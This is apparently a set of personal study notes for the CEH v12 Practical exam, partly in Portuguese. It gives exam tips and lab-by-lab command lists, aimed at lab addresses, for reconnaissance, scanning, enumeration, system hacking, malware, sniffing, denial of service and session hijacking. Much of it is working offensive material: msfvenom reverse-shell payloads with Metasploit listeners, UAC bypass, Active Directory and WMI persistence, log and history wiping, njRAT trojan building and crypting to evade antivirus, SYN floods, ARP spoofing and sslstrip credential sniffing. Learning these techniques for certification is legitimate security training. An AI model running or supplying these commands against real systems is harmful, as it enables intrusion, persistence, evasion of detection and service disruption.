# Dicas
```
https://github.com/hunterxxx/CEH-v12-Practical?authuser=0

agora temos 3 redes no novo ceh practical

invadir o windows por ms17-010 (privilege escalation)
ler o arquivo da maquina windows

acessar o samba do servidor por meio do file explorer
smb://

alterar parametro GET da aplicacao moviescope.com pegando data de niver do usuario john
view profile

IOT/OT - lab2 ilabs
dava um arquivo pcap, aonde tem o protocolo MQTT, encontrar o pacote
pois a flag eh o tamanho da mensagem MQTT que se encontra  dentro do pacote

MQTT
Port 1883 is the default MQTT port; 1883 is defined by IANA as MQTT over TCP.
usar wireshark

CRYPTO
a) uma crypto ntlm do windows lajogar crackstation online

b) hd encriptado, use uma ferramenta para extrair a flag dentro do hd
montar com o veracrypt

STEGO
entrar no windows com uma credencial valida que eles dao
la temos imagens com stegnanografia, achar qual imagem que eh usando a ferramenta OPENSTEGO
desesteganografar e a senha: imagination

QUEBRA DE SENHA

ftp com hydra

wifi
eh entregue um pcap com o wordlist
quebrar a senha do wifi usando o aircrack como na aula

ANDROID
descobrir um android na rede, comprometer ele e pegar a flag
map -sV -p 5555 --open x.x.x.x/24
conectar com phonesploit


1. Rodar nmap buscando a porta 3306 e após rodar nmap -O pra obter o SO
2. Logar na máquina windows usando rdp e usar o comando net user /domain para identificar o usuário adicionado
3. Cryptool para cifra DES(ECB) e ftp para máquina com flag1.txt
4. SNOW no arquivo encriptado
5. DVWA (ir na pasta dvwa/hackable/uploads e ler o arquivo txt)
6. Rdp na máquina 27
7. Comparar hashes dos arquivos com os salvos, usando HashCalc
8. Obter hash MD5 do arquivo e jogar na url dada
9. Cryptool com RC4
10. Olhar wp-config, logar no banco, pegar o hash e quebrar com John
11. Wireshark DOS (Olhar Statistics) e indicar o atacante
12. Ftp com Hydra usando Admin para pegar flag.txt
13. Wireshark DDOS (Olhar Statistics) e indicar quantas máquinas estavam
14. Montar um container com veracrypt e obter o arquivo dentro do container
15. Password Wireshark http.method.request==POST e identificar o usuário e senha passados em claro
16. BCTextEncoder Decrypt para obter a flag
17. Nmap -p 5555 Phonesploit e pegar o account number no SDcard
18. Método Vulnerável ZAP (POST)
19. SNOW no outro arquivo
20. Blind SQL com parameter tampering
```


# Lab 1 - Footprint and Reconnaissence
```
Lab Tasks
Ethical hackers or pen testers use numerous tools and techniques to collect information about the target. Recommended labs that will assist you in learning various footprinting techniques include:

Perform footprinting through search engines
            Gather information using advanced Google hacking techniques
            Gather information from video search engines
            Gather information from FTP search engines
            Gather information from IoT search engines

Perform footprinting through web services
            Find the company’s domains and sub-domains using Netcraft
            Gather personal information using PeekYou online people search service
            Gather an email list using theHarvester
                        -> theHarvester -d microsoft.com -l 200 -b baidu
                        -> theHarvester -d microsoft.com -l 200 -b linkedin

            Gather information using deep and dark web searching
            Determine target OS through passive footprinting

Perform footprinting through social networking sites
            Gather employees’ information from LinkedIn using theHarvester
            Gather personal information from various social networking sites using Sherlock

Perform website footprinting
            Gather information about a target website using ping command line utility
                        -> ping www.certifiedhacker.com -i 3 -f -l 1472 -n 2

            Gather information about a target website using Photon
                        -> python3 photon.py -u http://www.certifiedhacker.com -l 3 -t 200 --wayback

            Gather information about a target website using Central Ops
            Extract a company’s data using Web Data Extractor
            Mirror a target website using HTTrack Web Site Copier
            Gather information about a target website using GRecon
            Gather a wordlist from the target website using CeWL

Perform email footprinting
            Gather information about a target by tracing emails using eMailTrackerPro

Perform Whois footprinting
            Perform Whois lookup using DomainTools

Perform DNS footprinting
            Gather DNS information using nslookup command line utility and online tool
            Perform reverse DNS lookup using reverse IP domain check and DNSRecon
            Gather information of subdomain and DNS records using SecurityTrails

Perform network footprinting
            Locate the network range
                        ->  https://www.arin.net/about/welcome/region

            Perform network tracerouting in Windows and Linux Machines

Perform footprinting using various footprinting tools

Footprinting a target using Recon-ng
Footprinting a target using Maltego
Footprinting a target using OSRFramework
            -> domainfy -n [Domain Name] -t all
            -> searchfy -q "username"

            usufy - Gathers registered accounts with given usernames.
            mailfy – Gathers information about email accounts
            phonefy – Checks for the existence of a given series of phones
            entify – Extracts entities using regular expressions from provided URLs

Footprinting a target using FOCA
Footprinting a target using BillCipher
Footprinting a target using OSINT Framework
```

# Lab 2 - Scanning Networks
```
Lab Tasks
Ethical hackers and pen testers use numerous tools and techniques to scan the target network. Recommended labs that will assist you in learning various network scanning techniques include:

- Perform host discovery
      Perform host discovery using Nmap
      Perform host discovery using Angry IP Scanner

- Perform port and service discovery
      Perform port and service discovery using MegaPing
      Perform port and service discovery using NetScanTools Pro
      Perform port scanning using sx tool
            -> sx arp [Target subnet] --json | tee arp.cache
            -> cat arp.cache | sx tcp -p 1-65535 [Target IP address]
            -> cat arp.cache | sx udp --json -p 53 10.10.1.11
            

      Explore various network scanning techniques using Nmap
      Explore various network scanning techniques using Hping3
            -> hping3 -8 0-100 -S 10.10.1.22 -V
            -> hping3 --scan 0-100 -S 10.10.1.22
            -> hping3 [Target IP Address] --udp --rand-source --data 500

- Perform OS discovery
      Identify the target system’s OS with Time-to-Live (TTL) and TCP window sizes using Wireshark
      Perform OS discovery using Nmap Script Engine (NSE)
      Perform OS discovery using Unicornscan

- Scan beyond IDS and Firewall
      Scan beyond IDS/firewall using various evasion techniques
      Create custom packets using Colasoft Packet Builder to scan beyond the IDS/firewall
      Create custom UDP and TCP packets using Hping3 to scan beyond the IDS/firewall

- Perform network scanning using various scanning tools
      Scan a target network using Metasploit
            -> msfconsole
            -> db_status
            -> service postgresql restart
            -> exit
            -> msfdb init
            -> db_status
            -> nmap -Pn -sS -A -oX Test 10.10.1.0/24
            -> db_import Test
            -> hosts
            -> services
            -> search portscan
            -> use 6 
```

# Lab 3 - Enumeration
```
Perform NetBIOS enumeration

            Perform NetBIOS enumeration using Windows command-line utilities
                        -> nbtstat -a 10.10.1.11
                        -> nbtstat -c
                        -> net use

            Perform NetBIOS enumeration using NetBIOS Enumerator
            Perform NetBIOS enumeration using an NSE Script
                        ->  nmap -sV -v --script nbstat.nse 10.10.1.22
                        ->  nmap -sU -p 137 --script nbstat.nse [Target IP Address]
Perform SNMP enumeration

            Perform SNMP enumeration using snmp-check
                        -> snmp-check 10.10.1.22

            Perform SNMP enumeration using SoftPerfect Network Scanner
            Perform SNMP enumeration using SnmpWalk
                        -> snmpwalk -v1 -c public [target IP]
                        -> snmpwalk -v2c -c public [Target IP Address] 

            Perform SNMP enumeration using Nmap
                        -> nmap -sU -p 161 --script=snmp-sysdescr [target IP Address]
                        -> nmap -sU -p 161 --script=snmp-processes [target IP Address]
                        -> nmap -sU -p 161 --script=snmp-win32-software [target IP Address]
                        -> nmap -sU -p 161 --script=snmp-interfaces [target IP Address]
                        

Perform LDAP enumeration

            Perform LDAP enumeration using Active Directory Explorer (AD Explorer)
                        -> Softerra LDAP Administrator (https://www.ldapadministrator.com),
                        -> LDAP Admin Tool (https://www.ldapsoft.com),
                        -> LDAP Account Manager (https://www.ldap-account-manager.org), 
                        -> LDAP Search (https://securityxploded.com)

            Perform LDAP enumeration using Python and Nmap
                        -> nmap -sU -p 389 [Target IP address]
                        -> nmap -p 389 --script ldap-brute --script-args ldap.base='"cn=users,dc=CEH,dc=com"' [Target IP Address] 

                        -> python3
                        ->  import ldap3
                        ->  server=ldap3.Server('10.10.1.22', get_info=ldap3.ALL,port=389)
                        -> connection=ldap3.Connection(server)
                        -> connection.bind()
                        -> server.info
                        -> connection.search(search_base='DC=CEH,DC=com', search_filter='(&(objectclass=*))', search_scope='SUBTREE', attributes='*')
                        -> connection.entries
                        -> connection.search(search_base='DC=CEH,DC=com', search_filter='(&(objectclass=person))', search_scope='SUBTREE', attributes='userpassword')
                        -> connection.entires
            
            Perform LDAP enumeration using ldapsearch
                        ->  ldapsearch -h [Target IP Address] -x -s base namingcontexts
                        ->  ldapsearch -h [Target IP Address] -x -b “DC=CEH,DC=com”

Perform NFS enumeration

            Perform NFS enumeration using RPCScan and SuperEnum

Perform DNS enumeration

            Perform DNS enumeration using zone transfer
            Perform DNS enumeration using DNSSEC zone walking
            Perform DNS enumeration using Nmap
                        -> nmap --script=broadcast-dns-service-discovery www.certifiedhacker.com
                        -> nmap -T4 -p 53 --script dns-brute [Target Domain]
                        -> nmap --script dns-srv-enum --script-args "dns-srv-enum.domain='[Target Domain]'”
                        

Perform SMTP Enumeration

            Perform SMTP enumeration using Nmap

Perform RPC, SMB, and FTP enumeration

            Perform SMB and RPC enumeration using NetScanTools Pro
            Perform RPC, SMB, and FTP enumeration using Nmap

            smbclient //10.10.19.21/anonymous  (accessing smb shares)
            smbget -R smb://10.10.19.21/anonymous   (downloading smb files)

Perform enumeration using various enumeration tools

            Enumerate information using Global Network Inventory
            Enumerate network resources using Advanced IP Scanner
            Enumerate information from Windows and Samba hosts using Enum4linux
                        -> enum4linux -u martin -p apple -n [Target IP Address]
                        -> enum4linux -u martin -p apple -U [Target IP Address]
                        -> enum4linux -u martin -p apple -S [Target IP Address]
                        -> enum4linux -u martin -p apple -G [Target IP Address]

```

# Lab 4 - Vulnerability Analysis
```
Perform vulnerability research with vulnerability scoring systems and databases

            Perform vulnerability research in Common Weakness Enumeration (CWE)
            Perform vulnerability research in Common Vulnerabilities and Exposures (CVE)
            Perform vulnerability research in National Vulnerability Database (NVD)

Perform vulnerability assessment using various vulnerability assessment tools

            Perform vulnerability analysis using OpenVAS
            Perform vulnerability scanning using Nessus
            Perform web servers and applications vulnerability scanning using CGI Scanner Nikto
                        ->  nikto -h (Target Website) -Cgidirs all

```


# Lab 5 - System Hacking
```
Gain access to the system

            Perform active online attack to crack the system’s password using Responder
                        -> responder -I eth0

            Audit system passwords using L0phtCrack
            Find vulnerabilities on exploit sites
            Exploit client-side vulnerabilities and establish a VNC session
                        -> msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=[IP Address of Host Machine] LPORT=444 -o /home/attacker/Desktop/Test.exe
                        -> mkdir /var/www/html/share 
                        -> chmod -R 755 /var/www/html/share 
                        -> chown -R www-data:www-data /var/www/html/share
                        -> cp /home/attacker/Desktop/Test.exe
                        -> service apache2 start
                        -> msfconsole
                        -> use exploit/multi/handler
                        -> set payload windows/meterpreter/reverse_tcp
                        -> set LHOST 10.10.1.13
                        -> set LPORT 444
                        -> exploit
                        -> sysinfo
                        -> upload /root/PowerSploit/Privesc/PowerUp.ps1 PowerUp.ps1
                        -> shell
                        -> powershell -ExecutionPolicy Bypass -Command “. .\PowerUp.ps1;Invoke-AllChecks”
                        -> run vnc

            Gain access to a remote system using Armitage
                        ->  service postgresql start
                        

            Gain access to a remote system using Ninja Jonin
            Perform buffer overflow attack to gain access to a remote system


Perform privilege escalation to gain higher privileges

            Escalate privileges using privilege escalation tools and exploit client-side vulnerabilities
            Hack a Windows machine using Metasploit and perform post-exploitation using Meterpreter
            Escalate privileges by exploiting vulnerability in pkexec
            Escalate privileges in Linux machine by exploiting misconfigured NFS
                        -> showmount -e 10.10.1.9
                                    -> /home *
                        -> mkdir /tmp/nfs
                        -> sudo mount -t nfs 10.10.1.9:/home /tmp/nfs
                        -> cd /tmp/nfs
                        -> sudo cp /bin/bash .
                        -> sudo chmod +s bash
                        -> ls -la bash
                        -> sudo df -h

                        Find proccess to privilege escalation

                        -> cat /etc/crontab
                        -> ps -ef
                        -> find / -name "*.txt" -ls 2> /dev/null
                        -> route -n
                        -> find / -perm -4000 -ls 2> /dev/null (View the SUID executable binaries.)


            Escalate privileges by bypassing UAC and exploiting Sticky Keys
                        -> msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/Windows.exe
                        -> mkdir /var/www/html/share
                        -> chmod -R 755 /var/www/html/share
                        -> chown -R www-data:www-data /var/www/html/share 
                        -> cp /home/attacker/Desktop/Windows.exe /var/www/html/share/
                        -> service apache2 start
                        -> msfconsole
                        -> use exploit/multi/handler
                        -> set payload windows/meterpreter/reverse_tcp
                        -> set lhost 10.10.1.13
                        -> set lport 444
                        -> exploit
                        -> execute

                        Another Maquine
                        -> Windows.exe

                        -> sysinfo
                        -> getuid
                        -> background
                        -> search bypassuac
                        -> use exploit/windows/local/bypassuac_fodhelper
                        -> set session 1
                        -> exploit
                        -> getsystem -t 1
                        -> getuid
                        -> background
                        -> use post/windows/manage/sticky_keys
                        -> sessions i*
                        -> set session 2
                        -> exploit
                        -> lock out
                        -> press Shift key 5 times
            
            Escalate privileges to gather hashdump using Mimikatz


Maintain remote access and hide malicious activities

            User system monitoring and surveillance using Power Spy
            User system monitoring and surveillance using Spytech SpyAgent
            Hide files using NTFS streams
                        -> C:\Windows\System32
                        -> copy calc.exe C:\magic
                        -> cd  C:\magic
                        -> notepad readme.txt
                        -> HELLO WORLD!! >> readme.txt
                        -> C:\magic\calc.exe > c:\magic\readme.txt:calc.exe
                        -> C:\magic and delete calc.exe
                        -> mklink backdoor.exe readme.txt:calc.exe
                        -> backdoor.exe
            
            Hide data using white space steganography
            Image steganography using OpenStego and StegOnline
            Maintain persistence by abusing boot or logon autostart execution
                        -> bypassuac_fodhelper

            Maintain domain persistence by exploiting Active Directory Objects
                        -> msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/Exploit.exe
                        -> mkdir /var/www/html/share 
                        -> chmod -R 755 /var/www/html/share
                        -> chown -R www-data:www-data /var/www/html/share
                        -> cp /home/attacker/Desktop/Exploit.exe /var/www/html/share/
                        -> service apache2 start
                        -> msfconsole
                        -> use exploit/multi/handler
                        -> set payload windows/meterpreter/reverse_tcp
                        -> set lhost 10.10.1.13
                        -> set lport 444
                        -> run
                        -> http://10.10.1.13/share
                        -> Exploit.exe
                        meterpreter> getuid
                        meterpreter> upload -r /home/attacker/PowerTools-master C:\\Users\\Administrator\\Downloads
                        meterpreter> shell
                        meterpreter> cd C:\Windows\System32
                        meterpreter> powershell 
                        meterpreter> cd C:\Users\Administrator\Downloads\PowerView
                        meterpreter> Import-Module ./powerview.psm1
                        meterpreter> Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName Martin -Verbose -Rights All
                        meterpreter> Get-ObjectAcl -SamAccountName "Martin” -ResolveGUIDs
                        meterpreter> REG ADD HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /V AdminSDProtectFrequency /T REG_DWORD /F /D 300
                        meterpreter> net group “Domain Admins” Martin /add /domain

            Privilege escalation and maintain persistence using WMI
                        -> msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/Payload.exe
                        -> mkdir /var/www/html/share 
                        -> chmod -R 755 /var/www/html/share
                        -> chown -R www-data:www-data /var/www/html/share
                        -> cp /home/attacker/Desktop/Exploit.exe /var/www/html/share/
                        -> service apache2 start
                        -> msfconsole
                        -> use exploit/multi/handler
                        -> set payload windows/meterpreter/reverse_tcp
                        -> set lhost 10.10.1.13
                        -> set lport 444
                        -> http://10.10.1.13/share
                        -> Payload.exe
                        meterpreter> getuid
                        meterpreter> upload /home/attacker/Wmi-Persistence-master C:\\Users\\Administrator\\Downloads
                        meterpreter> load powershell 
                        meterpreter> powershell_shell
                        meterpreter> Import-Module ./WMI-Persistence.ps1
                        meterpreter> Install-Persistence -Trigger Startup -Payload “C:\Users\Administrator\Downloads\wmi.exe
                        meterpreter> msfconsole
                        -> Open new terminal
                        -> msfconsole
                        -> use exploit/multi/handler
                        -> set payload windows/meterpreter/reverse_tcp
                        -> set lhost 10.10.1.13
                        -> set lport 444
                        -> exploit
                        meterpreter> crtl + c
                        -> getuid

            Covert channels using Covert_TCP


Clear logs to hide the evidence of compromise

            View, enable, and clear audit policies using Auditpol
                        -> auditpol /get /category:*
                        -> auditpol /set /category:"system","account logon" /success:enable /failure:enable
                        -> auditpol /get /category:*
                        -> auditpol /clear /y

            Clear Windows machine logs using various utilities
                        -> wevtutil el
                        -> wevtutil cl
                        -> cipher /w:[Drive or Folder or File Location]

            Clear Linux machine logs using the BASH shell
                        -> export HISTSIZE=0  (HISTSIZE: determines the number of commands to be saved, which will be set to 0.)
                        ->  history -c
                        ->  history -w (delete the history of the current shell)
                        -> more ~/.bash_history
                        -> shred ~/.bash_history && cat /dev/null > .bash_history && history -c && exit  (first shreds the history file, then deletes it, and finally clears the evidence of using this command)

            Hiding artifacts in windows and Linux machines
                        -> mkdir Test
                        -> attrib +h +s +r Test  (Hide File)
                        -> attrib -s -h -r Test  (Unhide File)
                        -> net user Test /add    (Create User)
                        -> net user Test /active:yes (Active User)
                        -> net user Test /active:no (Hide  user account) 

            Clear Windows machine logs using CCleaner
```

# Lab 6 - Malware Threats
```
Gain access to the target system using Trojans

            Gain control over a victim machine using the njRAT RAT Trojan
                        -> E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Trojans Types\Remote Access Trojans (RAT)\njRAT and double-click njRAT v0.7d.exe.
                        -> default port number 5552 has been chosen.
                        -> click the Builder link
                        -> enter the IP address of the Windows 11 (attacker machine) machine in the Host field
                        -> Check the option Registy StarUp
                        -> Save As
                        -> Now, use any technique to send this server to the intended target through email or any other source (in real-time, attackers send this server to the victim).
                        -> Double-click the server (Test.exe) to run this malicious executable.
                        -> Right-click on the detected victim name and click Manager.

            Hide a Trojan using SwayzCryptor and make it undetectable to various anti-virus programs
                        -> navigate to the location where you saved the malware file Test.exe
                        -> Click Confirm upload on the VirusTotal page.
                        -> Go to E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Crypters\SwayzCryptor and double-click SwayzCryptor.exe.
                        -> Select a File dialog-box appears; navigate to the location of Test.exe (Desktop)            
                        -> Once the file is selected, check the options Start up, Mutex, and Disable UAC, and then click Encrypt.
                        -> The Save File CryptedFile.exe
                        -> click the Upload file CryptedFile.exe on VirusTotal

            Create a Trojan server using Theef RAT Trojan

Infect the target system using a virus
            Create a virus using the JPS Virus Maker Tool and infect the target system

Perform static malware analysis
            Perform malware scanning using Hybrid Analysis
            Perform a strings search using BinText

            Identify packaging and obfuscation methods using PEid
                        -> E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Malware Analysis Tools\Static Malware Analysis Tools\Packaging and Obfuscation Tools\PEid and double-click PEiD.exe.
                        -> Browse button to upload a malicious file for analysis
                        -> E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Viruses\Klez Virus Live!, select the face.exe file, and click Open.

            Analyze ELF executable file using Detect It Easy (DIE)
                        The Executable and Linkable Format (ELF) is a generic executable file format in Linux environment. It contains three main components including ELF header, sections, and segments.

                        -> E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Malware Analysis Tools\Static Malware Analysis Tools\Packaging and Obfuscation Tools\DIE
                        -> Open File
                        -> E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Viruses, select ELF Test File, and click Open.
                        -> File info button from the top right corner of the window. Info window appears, you can observe information such as
                                    -> File name, size, MD5, SHA1, Entropy, entry points, etc
                        -> Click Entropy

            Find the portable executable (PE) information of a malware executable file using PE Explorer
                        The Portable Executable (PE) format is the executable file format used on Windows OSes that stores the information a Windows system requires to manage the executable code.
                        The PE stores metadata about the program, which helps in finding additional details of the file.
                        For instance, the Windows binary is in PE format that consists of information such as time of creation and modification, import and export functions, compilation time, DLLs, and linked                             files, as well as strings, menus, and symbols.
            
                        -> E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Malware Analysis Tools\Static Malware Analysis Tools\PE Extraction Tools\PE Explorer and double-click PE.Explorer_setup.exe.
                        -> File and click Open File
                        -> E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Viruses\Klez Virus Live!. Select the face.exe
                        -> Session Data Directories
                        -> Session Headers


            Identify file dependencies using Dependency Walker
                        Any software program depends on the various inbuilt libraries of an OS that help in performing specified actions in a system.
                        Programs need to work with internal system files to function correctly. Programs store their import and export functions in a kernel32.dll file.
                        File dependencies contain information about the internal system files that the program needs to function properly; this includes the process of registration and location on the machine.
                        Find the libraries and file dependencies, as they contain information about the run-time requirements of an application.
                        Then, check to find and analyze these files to provide information about the malware in the file.
                        File dependencies include linked libraries, functions, and function calls. Check the dynamically linked list in the malware executable file.
                        Finding out all library functions may allow guessing about what the malware program can do. You should know the various DLLs used to load and run a program.

                        -> E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Malware Analysis Tools\Static Malware Analysis Tools\File Dependency Checking Tools\Dependency Walker, and double-click depends.exe
                        -> File and click Open to import the malicious file
                        -> E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Viruses\Klez Virus Live!. Select the snoopy.exe file and click Open.
                        -> Shrink the .DLL nodes to view all available DLLs for the malicious file.
            
            Perform malware disassembly using IDA and OllyDbg
                        IDA As a disassembler, IDA explores binary programs, for which the source code might not be available, to create maps of their execution
                        OllyDbg is a debugger that emphasizes binary code analysis, which is useful when source code is unavailable.
                        It traces registers, recognizes procedures, API calls switches, tables, constants, and strings, and locates routines from object files and libraries.
]
                        -> IDA: Quick start pop-up appears; click on New to select a malicious file for disassembly.
                        -> Select file to disassemble window.
                        -> E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Viruses\Klez Virus Live!, select face.exe, and click Open.
                        -> By default, the Portable executable for 80386 (PE) [pe64.dll] option selected; click OK.
                        -> Right-click anywhere and choose Text view
                        -> navigate to E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Malware Analysis Tools\Static Malware Analysis Tools\Disassembling and Debugging Tools\IDA
                        -> Copy the qwingraph.exe file and paste it in IDA’s installation location. In this task, the location is C:\Program Files\IDA Freeware 7.7.
                        -> navigate to View --> Graphs and click Flow chart.
                        -> Click the HexView-1 tab to view the hex value of the malicious file.
                        -> Click the Structures tab to view the structure of the file, as shown in the screenshot.

                        -> E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Malware Analysis Tools\Static Malware Analysis Tools\Disassembling and Debugging Tools\OllyDbg and double-click OLLYDBG.EXE.
                        -> Choose File from the menu bar, and then choose Open.
                        -> The Open 32-bit executable window appears; navigate to E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Viruses, select tini.exe, and click Open.
                        -> Choose View in the menu bar, and then choose Log
                        -> Choose View in the menu bar, and then choose Executable modules.
                        -> In this task, we are choosing the apphelp.dll module. The results might differ when you perform this task.
                        -> Choose View in the menu bar, and then choose Memory.
                        

                        What is the first subroutine function identified by IDA?
                                    -> sub_401000


            Perform malware disassembly using Ghidra (https://www.varonis.com/blog/how-to-use-ghidra)

                        Ghidra is a software reverse engineering (SRE) framework that includes a suite of full-featured,
                        high-end software analysis tools that enable users to analyze compiled code on a variety of platforms including Windows, MacOS, and Linux.

                        -> Navigate to E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Malware Analysis Tools\Static Malware Analysis Tools\Disassembling and Debugging Tools\Ghidra and double-click ghidraRun.bat.
                        -> Ghidra: NO ACTIVE PROJECT window appears, click File and select New Project….
                        -> Non-Shared Project and click Next
                        -> enter the Project Name as Malware Analysis and click Finish.
                        -> Now, navigate to File --> Import File…
                        -> Select File to Import window appears, navigate to E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Viruses\Klez Virus Live!, select face.exe
                        -> click OK
                        -> Double-click Face.exe node.
                        -> Analyze pop-up appears, click Yes.
                        -> click Analyze.
                        -> Program Tree, double-click Headers 

                        Use Ghidra to perform malware disassembly and find out the compiler ID of face.exe file?
                                    -> Windows


Perform dynamic malware analysis
            Perform port monitoring using TCPView and CurrPorts
                        -> E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Trojans Types\Remote Access Trojans (RAT)\njRAT and double-click njRAT v0.7d.exe
                        -> click the Builder link
                        -> Enter the IP address of the Windows 11 (attacker machine) machine in the Host field
                        -> Check the option Registy StarUp, rename ExeName as Trojan.exe
                        -> Save As window appears, E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Trojans Types\Remote Access Trojans (RAT)\njRAT. In the File name, enter Trojan.exe and click Save. Done!

                        -> switch to the Windows Server 2022 machine
                        -> Navigate to Z:\CEHv12 Module 07 Malware Threats\Trojans Types\Remote Access Trojans (RAT)\njRAT and double-click Trojan.exe.
                        -> Navigate to Z:\CEHv12 Module 07 Malware Threats\Malware Analysis Tools\Dynamic Malware Analysis Tools\Port Monitoring Tools\TCPView
                        -> Double-click Tcpview.exe
                        -> Now search for the Trojan.exe process in the TCPView.


                        -> Navigate to Z:\CEHv12 Module 07 Malware Threats\Malware Analysis Tools\Dynamic Malware Analysis Tools\Port Monitoring Tools\CurrPorts and
                        -> Double-click cports.exe.
                        -> Now search for the Trojan.exe process in the CurrPorts.
                        -> Double-click Trojan.exe and view the properties

            Perform process monitoring using Process Monitor
                        -> Z:\CEHv12 Module 07 Malware Threats\Malware Analysis Tools\Dynamic Malware Analysis Tools\Process Monitoring Tools\ProcessMonitor and
                        -> double-click Procmon.exe 
                        -> right-click on the process and select Properties Trojan.exe

            Perform registry monitoring using Reg Organizer
                        Registry monitoring tools such as Reg Organizer provide a simple way to track registry modifications, which is useful in troubleshooting and monitoring background changes.

                        -> E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Malware Analysis Tools\Dynamic Malware Analysis Tools\Registry Monitoring Tools\Reg Organizer
                        -> Double-click reg-organizer-setup.exe
                        -> click TOOLS from the menu bar and select Registry Snapshots
                        -> Create Snapshot option
                        -> Once the installation is complete, uncheck the Launch SoftPerfect Network Scanner option and click Finish.
                        -> click Compare with Current Registry option to compare the changes in the registry entries before and after installing SoftPerfect Network Scanner application

            Perform Windows services monitoring using Windows Service Manager (SrvMan)
                        You can trace malicious services initiated by the suspect file during dynamic analysis by using Windows service monitoring tools such as Windows Service Manager (SrvMan),
                        which can detect changes in services and scan for suspicious Windows services.

                        -> 


            Perform startup program monitoring using Autoruns for Windows and WinPatrol
            Perform installation monitoring using Mirekusoft Install Monitor
            Perform files and folder monitoring using PA File Sight
            Perform device driver monitoring using DriverView and Driver Reviver
            Perform DNS monitoring using DNSQuerySniffer
```

# Lab 7 - Sniffing 
```
MAC Flooding: Involves flooding the CAM table with fake MAC address and IP pairs until it is full
DNS Poisoning: Involves tricking a DNS server into believing that it has received authentic information when, in reality, it has not
ARP Poisoning: Involves constructing a large number of forged ARP request and reply packets to overload a switch
DHCP Attacks: Involves performing a DHCP starvation attack and a rogue DHCP server attack
Switch port stealing: Involves flooding the switch with forged gratuitous ARP packets with the target MAC address as the source
Spoofing Attack: Involves performing MAC spoofing, VLAN hopping, and STP attacks to steal sensitive information

Perform active sniffing

            Perform MAC flooding using macof
                        -> This tool floods the switch’s CAM tables (131,000 per minute) by sending forged MAC entries.
                        -> macof -i eth0 -n 10 

            Perform a DHCP starvation attack using Yersinia
                        -> yersinia -I

            Perform ARP poisoning using arpspoof
                        -> arpspoof -i eth0 -t 10.10.1.1 10.10.1.11
                        
            Perform an Man-in-the-Middle (MITM) attack using Cain & Abel
            Spoof a MAC address using TMAC and SMAC
            Spoof a MAC address of Linux machine using macchanger
                        -> ifconfig
                        -> ifconfig eth0 down
                        -> macchanger -s eth0   (Print the Mac Address)
                        -> macchanger -a eth0
                        -> macchanger -r eth0   (Set fully Random Mac)
                        -> ifconfig eth0 up
                        -> ifconfig

Perform network sniffing using various sniffing tools        
            Perform password sniffing using Wireshark
                        -> http.request.method == POST

            Analyze a network using the Omnipeek Network Protocol Analyzer
                        -> http.request.method == POST

Detect network sniffing
            Detect ARP poisoning and promiscuous mode in a switch-based network
                        -> nmap --script=sniffer-detect [Target IP Address/ IP Address Range] 
                        
            Detect ARP poisoning using the Capsa Network Analyzer
```

# Lab 8 - Social Engineering
```
Perform social engineering using various techniques
            Sniff credentials using the Social-Engineer Toolkit (SET)

Detect a phishing attack
            Detect phishing using Netcraft
            Detect phishing using PhishTank

Audit organization's security for phishing attacks
            Audit organization's security for phishing attacks using OhPhish

OhPhish 

```

# Lab 9 - Denial-of-Service
```
Perform DoS and DDoS attacks using various Techniques
            Perform a DoS attack (SYN flooding) on a target host using Metasploit
                        -> nmap -p 21 (Target IP address)
                        -> msfconsole
                        -> use auxiliary/dos/tcp/synflood
                        -> set RHOST 10.10.1.11
                        -> set RPORT 21            
                        -> set SHOST 10.10.1.19
                        -> exploit 

            Perform a DoS attack on a target host using hping3
                        -> hping3 -S (Target IP Address) -a (Spoofable IP Address) -p 22 --flood
                        -> hping3 -d 65538 -S -p 21 --flood (Target IP Address)
                        -> hping3 -2 -p 139 --flood (Target IP Address)

            Perform a DoS attack using Raven-storm
                        -> sudo rst
                        -> l4
                        -> ip 10.10.1.19
                        -> port 80
                        -> threads 20000
                        -> run
                        
            Perform a DDoS attack using HOIC
            Perform a DDoS attack using LOIC

Detect and protect against DoS and DDoS attacks
            Detect and protect against DDoS attacks using Anti DDoS Guardian
```

# Lab 10 - Session Hijacking
```
Perform session hijacking
            Hijack a session using Zed Attack Proxy (ZAP)
            Intercept HTTP traffic using bettercap
                        -> bettercap -iface eth0
                        -> net.probe on
                        -> set http.proxy.sslstrip true
                        -> set arp.spoof.internal true
                        -> set arp.spoof.targets 10.10.1.11
                        -> http.proxy on
                        -> arp.spoof on
                        -> net.sniff on
                        -> set net.sniff.regexp ‘.*password=.+’
                         
            
            Intercept HTTP traffic using Hetty

Detect session hijacking
            Detect session hijacking using Wireshark

```

# Lab 11 - Evading IDS, Firewalls, and Honeypots
```
Perform intrusion detection using various tools
            Detect intrusions using Snort
            Detect malicious network traffic using ZoneAlarm FREE FIREWALL
            Detect malicious network traffic using HoneyBOT

Evade firewalls using various evasion techniques
            Bypass firewall rules using HTTP/FTP tunneling
            Bypass antivirus using Metasploit templates
            Bypass firewall through Windows BITSAdmin

```

# Lab 12 - Hacking Web Servers
```
Footprint the web server
            Information gathering using Ghost Eye
                        -> pip install -r requirements.txt
                        -> python3 ghost_eye.py
                        -> 3
                        -> certifiedhacker.com
                        -> 6
                        
